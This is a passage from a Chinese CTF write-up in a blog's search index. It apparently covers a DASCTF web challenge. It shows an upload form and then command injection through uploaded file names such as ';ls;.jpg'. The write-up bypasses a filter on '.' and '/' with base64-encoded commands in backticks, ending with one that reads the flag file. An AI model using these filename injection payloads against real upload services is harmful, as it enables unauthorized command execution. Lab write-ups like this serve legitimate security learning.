class="string">&quot;http://d4cdc047-fde9-4f75-99ce-4f8b8d0cb06c.node4.buuoj.cn:81/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>选择文件<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;上传&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/DASCTF/My4.png"></p></li><li><p>接着发包两次，出现文件上传成功，接着修改文件名为<code>;ls;.jpg</code>，上传成功后，访问<code>?file=;ls;.jpg</code>，发现可以rce了。</p><p><img src="/DASCTF/My2.png"></p><p><img src="/DASCTF/My3.png"></p></li><li><p>因为<code>.</code>和<code>/</code>用不了，所以我们使用echo命令+反斜杠的方法来rce。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">比如 `echo 需要执行命令的base64编码 | base64 -d`</span><br><span class="line">传入文件名 ;`echo bHMgLw== | base64 -d`;.jpg ，即可成功查看根目录。</span><br></pre></td></tr></table></figure><p><img src="/DASCTF/My6.png"></p><p><img src="/DASCTF/My5.png"></p></li><li><p>最后上传文件名为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;`echo Y2F0IC9hZGoq | base64 -d`;.jpg</span><br></pre></td></tr></table></figure><p>即可得到flag。</p><p><img src="/DASCTF/My7.png"></p></li></ol><p>​</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write up </tag>
            
            <tag> WEB </tag>
            
            <tag> DASCTF </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
